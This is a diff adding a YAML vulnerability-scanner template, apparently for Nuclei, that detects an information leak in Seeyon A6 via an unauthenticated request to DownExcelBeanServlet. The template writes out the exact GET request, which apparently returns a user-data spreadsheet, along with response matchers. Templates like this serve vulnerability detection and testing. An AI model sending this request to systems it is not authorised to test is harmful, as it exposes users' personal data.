@@ -1,0 +1,25 @@
+id: SeeyonA6-DownExcelBeanServlet-infoLeak
+info:
+  name: SeeyonA6-DownExcelBeanServlet-infoLeak
+  author: iSee857
+  severity: high
+  description: |
+    SeeyonA6-DownExcelBeanServlet-infoLeak
+
+http:
+  - raw:
+      - |
+        GET /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Content-Type: application/vnd.ms-excel"
+          - "Content-Type: application/x-msdownload"
+        condition: or
